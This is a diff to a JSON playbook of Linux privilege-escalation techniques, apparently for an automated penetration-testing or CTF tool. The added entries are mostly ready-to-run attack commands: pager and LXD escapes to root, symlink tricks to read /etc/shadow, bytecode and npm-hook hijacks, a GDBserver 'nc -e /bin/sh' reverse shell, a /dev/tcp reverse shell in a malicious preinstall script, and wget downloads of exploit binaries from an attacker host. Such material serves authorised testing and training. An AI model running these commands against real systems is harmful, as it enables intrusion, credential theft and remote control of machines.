@@ -1,8 +1,8 @@
 {
   "id": "linux_privesc_2026_09",
   "title": "Linux Privilege Escalation",
-  "source": "Project-authored (obol-local). Common-knowledge Linux privilege-escalation methodology; independent expression, not derived from any third-party card set.",
-  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "source": "Project-authored. Common-knowledge Linux privilege-escalation methodology; independent expression, not derived from any third-party card set.",
+  "license": "Project-authored data. No third-party copyleft obligation.",
   "actions": [
     {
       "id": "linux-enum",
@@ -100,6 +100,11 @@
           "tool": "sh",
           "run": "sudo {{binary}} -c \"!/bin/sh\"",
           "note": "This is the general shape; the precise escape varies by binary, GTFOBins provides the exact command for each tool."
+        },
+        {
+          "tool": "sh",
+          "run": "sudo systemctl status {{service}}",
+          "note": "Pager escape (systemctl / journalctl / less): If sudo permits running systemctl status or journalctl without --no-pager, less is spawned when output fills terminal. In the pager, type '!sh' or '!/bin/sh' for an immediate root shell."
         }
       ]
     },
@@ -646,7 +651,8 @@
           "run": "gcc exploit.c -o exploit && ./exploit",
           "note": "Read the source first; compile on a matching box, then run and confirm uid=0."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "linux-path-hijack",
@@ -700,7 +706,8 @@
           "run": "{{suid_bin}}; id",
           "note": "Run the SUID binary; it resolves the bare name to yours and runs it as root."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "linux-ld-preload",
@@ -753,7 +760,8 @@
           "run": "id",
           "note": "Confirm the shell is uid 0."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "wildcard-injection",
@@ -770,7 +778,7 @@
         "linux"
       ],
       "requires_any": [
-        "privesc.cron",
+        "privesc.cron_writable",
         "foothold.linux",
         "access.shell"
       ],
@@ -814,8 +822,14 @@
           "tool": "sh",
           "run": "/tmp/rootbash -p -c id",
           "note": "uid=0 from the SUID bash confirms root on demand."
+        },
+        {
+          "tool": "sh",
+          "run": "cd {{writable_dir}} && ln -s {{target_file}} symlink.txt && 7z a archive.zip symlink.txt",
+          "note": "7z symlink / wildcard file read: When 7z or tar archives a directory with wildcards (*), creating a symlink to sensitive files (e.g. /etc/shadow or /root/root.txt) stores the symlinked contents inside the archive for unprivileged extraction."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "systemd-timer-abuse",
@@ -871,7 +885,8 @@
           "run": "systemctl daemon-reload 2>/dev/null; systemctl start {{unit}} 2>/dev/null; /tmp/rb -p -c id",
           "note": "Reload and start it, or wait for its timer; uid=0 confirms root."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "polkit-abuse",
@@ -927,7 +942,8 @@
           "run": "id",
           "note": "uid=0 confirms root; clean up any user you created."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "python-library-hijack",
@@ -945,7 +961,7 @@
       "requires_any": [
         "foothold.linux",
         "access.shell",
-        "privesc.cron"
+        "privesc.cron_writable"
       ],
       "produces": [
         "access.admin"
@@ -982,8 +998,14 @@
           "tool": "sh",
           "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > {{script_dir}}/{{module}}.py",
           "note": "Plant a module with the imported name; it runs as root on the next execution. Then /tmp/rb -p."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -m py_compile payload.py && cp __pycache__/payload.*.pyc {{script_dir}}/__pycache__/{{module}}.cpython-310.pyc",
+          "note": "PyCache / bytecode hijack: When source files are read-only but __pycache__ is writable, overwrite the compiled bytecode (.pyc) to execute commands when root imports {{module}}."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "container-escape",
@@ -1039,7 +1061,8 @@
           "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
           "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "dirtycow",
@@ -1085,7 +1108,8 @@
           "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt && /tmp/dcow",
           "note": "Compile and run on the target; the /etc/passwd variant then lets you su to the new root user."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "dirtypipe",
@@ -1131,7 +1155,8 @@
           "run": "gcc dirtypipe.c -o /tmp/dp && /tmp/dp /usr/bin/su",
           "note": "The exploit backs up and rewrites the SUID binary, then hands you a root shell; it restores the original after."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "baron-samedit",
@@ -1181,6 +1206,388 @@
           "tool": "python",
           "run": "python3 CVE-2021-3156/exploit_nss.py",
           "note": "Spawns a root shell; no sudo rights are required for your user."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "wildcard-symlink-privesc",
+      "transition": "privesc_act",
+      "title": "Archive Wildcard Symlink Abuse",
+      "phase": "privesc",
+      "hypothesis": "Archiving utilities (7za, tar, zip) executed by root via cron or sudo with directory wildcards (e.g. 7za a backup.zip /var/www/html/*) follow symlinks. Creating a symlink inside the targeted folder pointing to /root/root.txt or /etc/shadow forces the privileged backup to pack the target file into the archive, readable by any user.",
+      "tool": "ln",
+      "tools": [
+        "ln",
+        "unzip",
+        "7z"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "access.shell",
+        "foothold.linux"
+      ],
+      "produces": [
+        "objective.root_flag",
+        "credential.candidate"
+      ],
+      "priority": 82,
+      "proves": "coerces privileged archive processes to follow symlinks and exfiltrate root-only files into an accessible archive",
+      "does_not_prove": "direct root command execution, only arbitrary file read",
+      "report": {
+        "finding": "Privilege Escalation via Insecure Archive Wildcard Processing",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html"
+      ],
+      "commands": [
+        {
+          "tool": "ln",
+          "run": "ln -s /root/root.txt {{writable_dir}}/root_link && ls -la {{writable_dir}}",
+          "note": "Step 1: Create a symlink named root_link in the folder monitored/archived by the backup script pointing to /root/root.txt."
+        },
+        {
+          "tool": "unzip",
+          "run": "unzip -p {{backup_archive}} root_link",
+          "note": "Step 2: Once the scheduled archive or backup job runs, extract the contents of the symlinked file directly from the generated archive."
+        }
+      ]
+    },
+    {
+      "id": "git-repo-forensics",
+      "title": "Local Git Repository Forensics & History Inspection",
+      "hypothesis": "When an operator discovers a .git directory on a Linux target (in /var/www, /opt, or user home), developers often commit sensitive credentials, API keys, database passwords, or configuration files that are later removed or modified in HEAD. Examining commit diffs, previous commits, and remote URLs frequently recovers valid plaintext credentials or high-value configuration secrets.",
+      "tool": "git",
+      "tools": [
+        "git",
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux"
+      ],
+      "produces": [
+        "credential.candidate",
+        "loot.files"
+      ],
+      "priority": 78,
+      "phase": "privesc",
+      "proves": "uncovers candidate credentials, API keys, or leaked configurations from commit history and diffs in local git repositories",
+      "does_not_prove": "does not prove active access or valid authentication until credentials are tested against a live service",
+      "report": {
+        "finding": "Sensitive Credentials Exposed in Git Repository Commit History",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensics/git-forensics.html"
+      ],
+      "commands": [
+        {
+          "tool": "git",
+          "run": "git status && git log -p -n 5",
+          "note": "PREFERRED (Recent Commit Inspection): Dumps the recent 5 git commits along with full patch diffs. Look for added/removed password variables, configuration changes, or API tokens."
+        },
+        {
+          "tool": "git",
+          "run": "git log --all --full-history -- \"**/settings*\" \"**/config*\" \"**/secret*\" \"*pass*\"",
+          "note": "CONFIG & SECRET COMMITS: Trace git history across all branches specifically targeting configuration files and password references."
+        },
+        {
+          "tool": "git",
+          "run": "git diff HEAD~1",
+          "note": "PREVIOUS COMMIT DIFF: Compare working tree or HEAD against the preceding commit to spot recently modified or stripped credentials."
+        },
+        {
+          "tool": "sh",
+          "run": "cat .git/config",
+          "note": "GIT CONFIG REMOTES: Inspect remote origin URLs. Hardcoded basic auth tokens or dev credentials frequently appear in remote URLs."
+        },
+        {
+          "tool": "git",
+          "run": "git branch -a && git checkout {{branch}}",
+          "note": "BRANCH SWITCH: Inspect alternative and development branches where unmerged feature code or test credentials may reside."
+        }
+      ]
+    },
+    {
+      "id": "lxd-container-privesc",
+      "transition": "privesc_act",
+      "title": "LXD / LXC Group Membership Host Filesystem Mount Privesc",
+      "hypothesis": "Users belonging to the local 'lxd' or 'lxc' group have full control over the LXD daemon socket (/var/lib/lxd/unix.socket). Members can import an alpine container image with security.privileged=true and mount the entire host root filesystem (/mnt/root) to obtain instant root access.",
+      "tool": "lxc",
+      "tools": [
+        "lxc"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "elevate",
+      "requires_any": [
+        "foothold.linux",
+        "privesc.lxd_group"
+      ],
+      "produces": [
+        "access.root"
+      ],
+      "priority": 85,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root host filesystem access via privileged LXD container mount",
+      "does_not_prove": "escalation without membership in the lxd group or without access to the lxd socket",
+      "report": {
+        "finding": "LXD Group Membership Arbitrary Host Filesystem Mount",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.hackingarticles.in/lxd-privilege-escalation/"
+      ],
+      "commands": [
+        {
+          "tool": "lxc",
+          "run": "lxc image import alpine.tar.gz --alias myimage",
+          "note": "Imports local minimal Alpine Linux image into the target LXD image store."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc init myimage privbox -c security.privileged=true",
+          "note": "Initializes a privileged container where root inside container maps to root on host."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc config device add privbox hostroot disk source=/ path=/mnt/root recursive=true",
+          "note": "Mounts the entire host root filesystem into /mnt/root inside the container."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc start privbox && lxc exec privbox /bin/sh",
+          "note": "Starts container and enters interactive root shell with full write access to host /mnt/root."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "gdbserver-remote-execution",
+      "title": "GDBserver Remote Code Execution (TCP 1337)",
+      "hypothesis": "An exposed GDBserver instance on TCP 1337 allows connecting with gdb remote debugging and invoking arbitrary shell commands or executing payloads via call (void)system().",
+      "tool": "gdb",
+      "tools": [
+        "gdb"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:1337"
+      ],
+      "produces": [
+        "foothold.shell"
+      ],
+      "priority": 76,
+      "phase": "access",
+      "proves": "demonstrates remote code execution through exposed GDBserver debugging endpoint",
+      "does_not_prove": "user context matches gdbserver process owner",
+      "report": {
+        "finding": "Unauthenticated GDBserver Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-gdbserver"
+      ],
+      "commands": [
+        {
+          "tool": "gdb",
+          "run": "gdb -q -ex 'target remote {{target}}:1337' -ex 'set remote exec-file /bin/sh' -ex 'run'",
+          "note": "Connect to target GDBserver on TCP port 1337 and invoke remote executable execution."
+        },
+        {
+          "tool": "gdb",
+          "run": "gdb -q -ex 'target remote {{target}}:1337' -ex 'call (void)system(\"nc -e /bin/sh {{lhost}} {{lport}}\")'",
+          "note": "Execute reverse shell payload via system call injection inside debugged target process."
+        }
+      ]
+    },
+    {
+      "id": "gnu-screen-root-attach",
+      "title": "GNU Screen / Tmux Root Session Attachment",
+      "hypothesis": "When an active screen or tmux session is spawned by root in multi-user mode or with world-accessible Unix domain sockets in /run/screen or /tmp, attaching to the session gives an immediate interactive root terminal.",
+      "tool": "screen",
+      "tools": [
+        "screen",
+        "tmux"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 82,
+      "phase": "escalate",
+      "proves": "achieves instant root access by attaching to a privileged active screen or tmux terminal session",
+      "does_not_prove": "persistence or independent root credentials",
+      "report": {
+        "finding": "Root Access via Shared Screen/Tmux Session Attachment",
+        "severity": "critical"
+      },
+      "refs": [],
+      "commands": [
+        {
+          "tool": "screen",
+          "run": "screen -x root/root",
+          "note": "Attach to an active root GNU screen session running in multi-user mode."
+        },
+        {
+          "tool": "tmux",
+          "run": "tmux -S {{socket_path}} attach",
+          "note": "Attach to a world-readable root tmux session socket to spawn interactive root prompt."
+        }
+      ]
+    },
+    {
+      "id": "chkrootkit-local-privesc",
+      "transition": "privesc_act",
+      "title": "chkrootkit Cron Execution Local Privilege Escalation",
+      "hypothesis": "Legacy versions of chkrootkit (< 0.49) running periodically under cron execute /tmp/update with root privileges if present. Dropping a malicious /tmp/update script grants root access upon cron execution.",
+      "tool": "bash",
+      "tools": [
+        "bash"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux",
+        "vuln.chkrootkit"
+      ],
+      "produces": [
+        "access.root"
+      ],
+      "priority": 90,
+      "phase": "escalate",
+      "proves": "exploits insecure /tmp/update execution in chkrootkit cron job to gain root privileges",
+      "does_not_prove": "system compromise without a scheduled cron invocation",
+      "report": {
+        "finding": "Local Privilege Escalation via chkrootkit Insecure File Execution (CVE-2014-0476)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/33899"
+      ],
+      "commands": [
+        {
+          "tool": "bash",
+          "run": "echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/update && chmod +x /tmp/update",
+          "note": "Plant an executable script at /tmp/update to be invoked by vulnerable chkrootkit (<0.49) cron runs."
+        },
+        {
+          "tool": "bash",
+          "run": "/bin/bash -p",
+          "note": "Spawn elevated root shell utilizing the newly minted SUID bash binary."
+        }
+      ]
+    },
+    {
+      "id": "npm-package-privesc",
+      "transition": "privesc_act",
+      "title": "npm Package Lifecycle Hook Local Privilege Escalation",
+      "hypothesis": "User has sudo permissions to execute npm install. Crafting a local npm package with a malicious preinstall script executes commands as root when installed globally.",
+      "tool": "bash",
+      "tools": [
+        "bash",
+        "sudo"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux"
+      ],
+      "produces": [
+        "access.root"
+      ],
+      "priority": 90,
+      "phase": "escalate",
+      "proves": "exploits sudo npm install permissions to execute commands as root via package preinstall lifecycle hook",
+      "does_not_prove": "privilege escalation without sudo npm privileges",
+      "report": {
+        "finding": "Local Privilege Escalation via Sudo npm Package Installation Hook",
+        "severity": "high"
+      },
+      "refs": [
+        "https://gtfobins.github.io/gtfobins/npm/"
+      ],
+      "commands": [
+        {
+          "tool": "bash",
+          "run": "mkdir -p /tmp/pkg && echo '{\"name\":\"pkg\",\"version\":\"1.0.0\",\"scripts\":{\"preinstall\":\"/bin/bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"\"}}' > /tmp/pkg/package.json",
+          "note": "Create a malicious npm package structure defining a reverse shell in the preinstall lifecycle hook."
+        },
+        {
+          "tool": "sudo",
+          "run": "sudo /usr/bin/npm i -g /tmp/pkg",
+          "note": "Invoke npm install with sudo privileges targeting local malicious package to trigger root preinstall script."
+        }
+      ]
+    },
+    {
+      "id": "screen-suid-privesc",
+      "transition": "privesc_act",
+      "title": "GNU Screen 4.5.0 SUID Arbitrary Library Load Local Root (CVE-2017-5618)",
+      "hypothesis": "Target system has GNU Screen 4.5.0 installed with SUID permissions. Exploiting the logfile creation vulnerability allows writing arbitrary content into /etc/ld.so.preload, executing a dropped shared library as root upon next invocation.",
+      "tool": "bash",
+      "tools": [
+        "bash",
+        "screen",
+        "wget"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.screen_suid",
+        "privesc.suid_candidate",
+        "foothold.linux"
+      ],
+      "produces": [
+        "access.root"
+      ],
+      "priority": 92,
+      "phase": "escalate",
+      "proves": "root shell access via GNU Screen 4.5.0 SUID ld.so.preload privilege escalation",
+      "does_not_prove": "kernel-level root exploitation on patched screen versions",
+      "report": {
+        "finding": "Local Root Privilege Escalation via SUID GNU Screen 4.5.0 (CVE-2017-5618)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/41154",
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5618"
+      ],
+      "commands": [
+        {
+          "tool": "wget",
+          "run": "cd /tmp && wget -q http://{{lhost}}:{{web_port}}/libhax.so -O /tmp/libhax.so && wget -q http://{{lhost}}:{{web_port}}/rootshell -O /tmp/rootshell && chmod +x /tmp/rootshell",
+          "note": "Download precompiled libhax.so and rootshell helper binaries from Kali HTTP server to target /tmp."
+        },
+        {
+          "tool": "screen",
+          "run": "cd /etc && umask 000 && screen-4.5.0 -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\" && screen-4.5.0 -ls; /tmp/rootshell",
+          "note": "Exploit Screen 4.5.0 setuid logfile creation to inject libhax.so into /etc/ld.so.preload and execute dropped rootshell binary."
         }
       ]
     }
